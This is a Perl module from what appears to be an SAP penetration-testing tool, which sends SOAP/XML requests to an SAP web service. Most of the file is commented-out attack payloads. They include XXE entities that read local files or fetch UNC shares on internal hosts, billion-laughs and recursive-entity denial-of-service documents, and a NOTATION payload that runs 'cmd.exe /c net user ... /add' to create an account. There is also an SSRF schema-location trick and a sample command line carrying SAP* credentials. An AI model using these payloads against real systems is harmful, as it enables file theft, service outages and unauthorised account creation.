#!/usr/bin/perl
# Module RFC_PING


# CONFIG
######################
my $desc ="TEST: Test\n"; 
our $funcName="rfc_Test_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub rfc_Test_Func()
{

#perl black.pl 192.168.2.205 8000 SAP* india123 000 1

	# my $XML='
# <!DOCTYPE bar 
# [
  # <!ENTITY foo SYSTEM "//172.16.0.123/test">
  # <!ELEMENT bar ANY>
# ]>
# <bar>&foo;
# </bar>
# ';
# $XML='
# <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	# <SOAP-ENV:Body>
		# <m:SMUM_XML_PARSE xmlns:m="urn:sap-com:document:sap:rfc:functions">
			# <XML_TABLE>
				# <item>
					# <HIER>127</HIER>
					# <TYPE>a</TYPE>
					# <CNAME>
  # <!ENTITY foo SYSTEM "//172.16.0.123/test">
  # <!ELEMENT bar ANY>
# <bar>&foo;
# </bar></CNAME>
					# <CVALUE>
  # <!ENTITY foo SYSTEM "//172.16.0.123/test">
  # <!ELEMENT bar ANY>

# <bar>&foo;
# </bar></CVALUE>
				# </item>
			# </XML_TABLE>
		# </m:SMUM_XML_PARSE>
	# </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>

# ';

# my $XML='
# <!DOCTYPE value [
# <!ENTITY attack SYSTEM "\\\C:\BOOT.INI">
# ]>
# <SOAP-ENV:Envelope xmlns:ns1="http://myPackageNamespace" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
# <SOAP-ENV:Body>
# <addRequest requestID="create_1">
# <attributes>
# <attr name="objectclass">
# <value>sapgroup</value>
# </attr>
# <attr name="uniquename">
# <value>SAPTestGroup_3</value>
# </attr>
# <attr name="description">
# <value>&attack;</value>
# </attr>
# </attributes>
# </addRequest>

# </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>

# ';
# my $XML='
# <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" xsi:noNamespaceSchemaLocation="\\\\172.16.0.123\\aaa.xsd">
 # <SOAP-ENV:Header/>
 # <SOAP-ENV:Body>
# <schemaRequest requestID="schema">
# <schemaIdentifier
# schemaIDType="urn:oasis:names:tc:SPML:1:0#GenericString">
# <schemaID>SAPprincipals1</schemaID>
# </schemaIdentifier>
# </schemaRequest>
 # </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>
# ';
my $XML='

        <Discover>
&foo;
        </Discover>
';
# my $XML='
# <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     # <SOAP-ENV:Header/>
     # <SOAP-ENV:Body>
        # <WS_EXCEL xmlns="urn:sap-com:document:sap:rfc:functions">
           # <filename>d:\test.txt</filename>
        # </WS_EXCEL>
     # </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>
# ';



my $XML='
<?xml version="1.0" encoding="UTF-8" ?>
 <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema"><SOAP-ENV:Header><sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/"><enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body><ns1:testWebServices xmlns:ns1="urn:GRMGWSTestBeanVI"></ns1:testWebServices></SOAP-ENV:Body></SOAP-ENV:Envelope>
';

	# my $XML='
	# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE lolz [
  # <!ENTITY lol "lol">
  # <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  # <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  # <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  # <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  # <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  # <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  # <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  # <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
# ]>
# <lolz>&lol9;</lolz>
# ';
# # # 
# my $XML='
# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE test [<!ENTITY foo SYSTEM "\\\\172.16.0.123\\aaaa">]>
# <test>&foo;</test>
# ';

# my $XML='
# <SAP_CCMS:DataSupplierReport extcompany="Test" extproduct="New">
	# <MTE:Instance type="PERFORMANCE_ATTRIBUTE" class="XML_TEST_PAttrib"
# owner="XML_TEST">
	# <MTE:FullName>D:\test.txt</MTE:
# FullName>
	# <PRF:PerformanceParameters>
	# <PRF:TotalVal>300</PRF:TotalVal>
	# <PRF:NumberVal>1</PRF:NumberVal>
	# <PRF:ReportedBy>XML_TEST</PRF:ReportedBy>
	# </PRF:PerformanceParameters>
	# </MTE:Instance>
	# </SAP_CCMS:DataSupplierReport> 
	# ';
	
# my $XML='
 # <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE TABNAM [<!ENTITY foo SYSTEM "\\\\172.16.0.123\\aaaa">]>

# # ';
# my $XML='
# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE root [
	# <!ENTITY foo SYSTEM "\\\\172.16.0.123\\test.txt">
	# ]>
# <root>&foo;</root>
# ';
# my $XML='
# <!DOCTYPE d [
  # <!ELEMENT d (picture)*>
  # <!ELEMENT picture EMPTY>
  # <!ATTLIST picture type NOTATION (gif|jpg) "gif">
  # <!NOTATION gif SYSTEM "cmd.exe">
  # <!NOTATION jpg SYSTEM "cmd.exe /c net user asdasd 123QWEasd /add">
# ]>
# <d>
  # <picture type="gif"/>
  # <picture type="jpg"/>
# </d>
# ';
	# my $XML='
# <schemaRequest requestID="schema_01">
# <schemaIdentifier schemaIDType="urn:oasis:names:tc:SPML:1:0#GenericString">
# <schemaID>asd</schemaID>
# </schemaIdentifier>
# </schemaRequest>
# ';
# my $XML='
# <SAP_CCMS:DataSupplierReport >
	# <MTE:Instance type="CONTEXT" class="XML_TEST" owner="XML_TEST"
# numrange="AL_NR_AUTO" descmsgid="RT" descmsgno="112" co_method="CCMS_XML_FILE_POLL"
# an_method="cxml_an" au_method="cxml_au">
	# <MTE:Name>XML</MTE:Name>
	# <CNTXT:ContextParameters cntxt_clnt="000" cntxt_sysw="YES">
	# </CNTXT:ContextParameters>
	# <MTE:Instance type="OBJECT" class="XML_TEST_OBJECT" owner="XML_TEST"
# numrange="AL_NR_AUTO" descmsgid="RT" descmsgno="113" co_method="CCMS_XML_FILE_POLL"
# an_method="oxml_an" au_method="oxml_au">
	# <MTE:Name>Test_Object</MTE:Name>
	# <MTE:Instance type="LOG_ATTRIBUTE" class="XML_TEST_LAttrib"
# numrange="AL_NR_AUTO" owner="XML_TEST" descmsgid="RT" descmsgno="204"
# co_method="CCMS_XML_FILE_POLL" an_method="lxml_an" au_method="lxml_au">
	# <MTE:Name>Test_Log_Attr1</MTE:Name>
	# <LOG:LogParameters agroup="Test_LAttrGrp1" subtype="AL_STD_MSC_CACHE"
# severity="75" alkptype="AL_KEEP_OLDEST" alkpmax="12" sec_repeat="240" sec_inact="600"
# sec_warmup="10" m_maxalmid="22" m_kplinetp="AL_TD_KL_OLDEST" m_kplinemx="212"
# m_amsgmode="AL_TD_MSC_VAL_MODE_WORST_SINCE" m_msgtimfr="302">
	# <LOG:M_RaiseSev>89</LOG:M_RaiseSev>
	# <LOG:M_RaiseVal>AL_VAL_YELLOW</LOG:M_RaiseVal>
	# <LOG:AlMsgID>00</LOG:AlMsgID>
	# <LOG:AlMsgNo>398</LOG:AlMsgNo>
	# <LOG:AlMsgVal>AL_VAL_RED</LOG:AlMsgVal>
	# <LOG:AlMsgSev>210</LOG:AlMsgSev>
	# <LOG:M_Client>010</LOG:M_Client>
	# <LOG:M_User>XML_TEST</LOG:M_User>
	# <test>aaa</test>
	# <LOG:MsgArg1>&attack;</LOG:MsgArg1>
	# <LOG:DefaultMsg>Hello World!</LOG:DefaultMsg>
	# <LOG:ReportedBy>XML_TEST</LOG:ReportedBy>
	# </LOG:LogParameters>
	# </MTE:Instance>
	# </MTE:Instance>
	# </MTE:Instance>
	# </SAP_CCMS:DataSupplierReport> 
# # ';
# my $XML='
         # 127<?xml version="1.0"?><LoginRequest r="admin" p="bm3AiizFcEY4MU84exizayu8YS0=" d="" v="1.50" h="true" ew="false"></LoginRequest>
# ';

# POST /wsalvpdf/Config1?style=document HTTP/1.1

# <?xml version="1.0" encoding="UTF-8" ?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema"><SOAP-ENV:Header><sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/"><enableSession>true</enableSession></sapsess:Session></SOAP-ENV:Header><SOAP-ENV:Body><pns:createExport xmlns:pns='urn:wsalvpdfVi'><pns:exportXml></pns:exportXml><pns:xdcName></pns:xdcName><pns:prType></pns:prType><pns:adsType></pns:adsType><pns:pdfRequested>false</pns:pdfRequested><pns:printRequested>false</pns:printRequested></pns:createExport></SOAP-ENV:Body></SOAP-ENV:Envelope>
# "

# my $XML='
# <!DOCTYPE lolz [
  # <!ENTITY lol "&lol2">
  # <!ENTITY lol2 "&lol">
# ]>
# <lolz>&lol;</lolz>
# ';
# my $XML='
# <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"  xmlns:xsd="http://www.w3.org/1999/XMLSchema"  xmlns:xsi="http://www.w3.org/1999/XMLSchema-instance"  xmlns:m0="http://tempuri.org/"  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
     # <SOAP-ENV:Header/>
     # <SOAP-ENV:Body>
        # <RFC_FUNCTION_SEARCH xmlns="urn:sap-com:document:sap:rfc:functions">
           # <FUNCNAME></FUNCNAME>
           # <FUNCTIONS>
             # <item>
               # <FUNCNAME></FUNCNAME>
               # <GROUPNAME></GROUPNAME>
               # <APPL></APPL>
               # <HOST></HOST>
               # <STEXT></STEXT>
             # </item>
           # </FUNCTIONS>
           # <GROUPNAME>*</GROUPNAME>
           # <LANGUAGE></LANGUAGE>
        # </RFC_FUNCTION_SEARCH>
     # </SOAP-ENV:Body>
# </SOAP-ENV:Envelope>
# ';

# my $XML='
# <?xml version="1.0" encoding="utf-8"?>
# <Address xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
         # xsi:noNamespaceSchemaLocation="http://172.16.0.123/testz">
  # <Recipient>Mr. Walter C. Brown</Recipient>
  # <House>49</House>
  # <Street>Featherstone Street</Street>
  # <Town>LONDON</Town>
  # <PostCode>EC1Y 8SY</PostCode>
  # <Country>UK</Country>
# </Address>
# ';

	print $XML;
		
	my @answers=send_soap($XML,1, '/GRMGWSTest/service?style=rpc');
	#my @answers=send_soap($XML,1,'');
	
	my $answer=join('', @answers);
	print $answer;
	
	print "\n\n";

}


# <xml version="1.0">
# <!DOCTYPE d [
  # <!ELEMENT d (picture)*>
  # <!ELEMENT picture EMPTY>
  # <!ATTLIST picture type NOTATION (gif|jpg) "gif">
  # <!NOTATION gif SYSTEM "cmd.exe">
  # <!NOTATION jpg SYSTEM "cmd.exe">
# ]>

# <d>
  # <picture type="gif"/>
# </d>

# <xml version="1.0">
# <!DOCTYPE bar 
# [
  # <!ENTITY foo SYSTEM "//192.168.2.205/C$/test.txt">
  # <!ELEMENT bar ANY>
# ]>
# <bar>&foo;
# </bar>


# <xml version="1.0">
# <!DOCTYPE lolz [
  # <!ENTITY lol "lol">
  # <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  # <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  # <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  # <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  # <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  # <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  # <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  # <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
# ]>
# <lolz>&lol9;</lolz>

# <!DOCTYPE root [
	# <!ENTITY foo SYSTEM "//172.16.0.123/test">
	# ]>
# <in>&foo;</in>